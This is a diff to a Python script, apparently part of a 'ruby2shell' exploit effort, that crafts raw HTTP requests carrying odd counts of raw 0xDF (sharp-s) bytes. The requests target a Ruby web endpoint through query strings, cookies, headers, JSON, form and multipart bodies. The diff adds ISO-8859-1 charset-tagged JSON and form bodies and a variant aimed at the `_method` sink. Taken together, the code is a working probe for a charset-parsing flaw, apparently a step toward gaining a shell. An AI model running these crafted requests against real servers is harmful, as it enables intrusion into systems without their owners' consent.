@@ -12,6 +12,8 @@ RUBY2SHELL_W371_SURFACES=comma,separated,list narrows the sweep.
 RUBY2SHELL_W371_CONTROL=1 adds the known `_method` multipart control.
 Odd sharp-s count = 21 in every variant, with no raw 0xDF in the request
 target (percent-encoded there) so the server parses the request at all.
+W372 adds charset-tagged (ISO-8859-1) JSON and urlencoded bodies with raw 0xDF
+keys/values; the opt-in form-charset-method is the known `_method` sink.
 """
 
 import os
@@ -29,7 +31,8 @@ BOUNDARY = b"XW371BOUND"
 ALL = [
     "query-key", "query-val", "cookie-name", "cookie-val", "auth-scheme",
     "accept", "content-type", "json-raw", "json-escaped", "header-value",
-    "form-body", "multipart-part",
+    "form-body", "multipart-part", "json-charset-val", "json-charset-key",
+    "form-charset-val", "form-charset-key",
 ]
 
 
@@ -64,6 +67,26 @@ def build(surface):
         return (b"POST", PATH,
                 headers + [(b"Content-Type", b"application/x-www-form-urlencoded")],
                 b"k=" + PCT)
+    if surface == "json-charset-val":
+        return (b"POST", PATH,
+                headers + [(b"Content-Type",
+                            b"application/json; charset=ISO-8859-1")],
+                b'{"k":"' + SHARP + b'"}')
+    if surface == "json-charset-key":
+        return (b"POST", PATH,
+                headers + [(b"Content-Type",
+                            b"application/json; charset=ISO-8859-1")],
+                b'{"' + SHARP + b'":"v"}')
+    if surface == "form-charset-val":
+        return (b"POST", PATH,
+                headers + [(b"Content-Type",
+                            b"application/x-www-form-urlencoded; charset=ISO-8859-1")],
+                b"k=" + SHARP)
+    if surface == "form-charset-key":
+        return (b"POST", PATH,
+                headers + [(b"Content-Type",
+                            b"application/x-www-form-urlencoded; charset=ISO-8859-1")],
+                SHARP + b"=v")
     if surface == "multipart-part":
         body = (b"--" + BOUNDARY + b"\r\n"
                 b'Content-Disposition: form-data; name="left"\r\n'
@@ -82,6 +105,11 @@ def build(surface):
                 headers + [(b"Content-Type",
                             b"multipart/form-data; boundary=" + BOUNDARY)],
                 body)
+    if surface == "form-charset-method":
+        return (b"POST", PATH,
+                headers + [(b"Content-Type",
+                            b"application/x-www-form-urlencoded; charset=ISO-8859-1")],
+                b"_method=" + ODD)
     raise ValueError("unknown surface " + surface)
 
 
@@ -90,6 +118,7 @@ def main():
     surfaces = os.environ.get("RUBY2SHELL_W371_SURFACES", ",".join(ALL)).split(",")
     if os.environ.get("RUBY2SHELL_W371_CONTROL", "0") == "1":
         surfaces.append("method-odd")
+        surfaces.append("form-charset-method")
     for surface in surfaces:
         method, target, headers, body = build(surface.strip())
         request = method + b" " + target + b" HTTP/1.1\r\n"
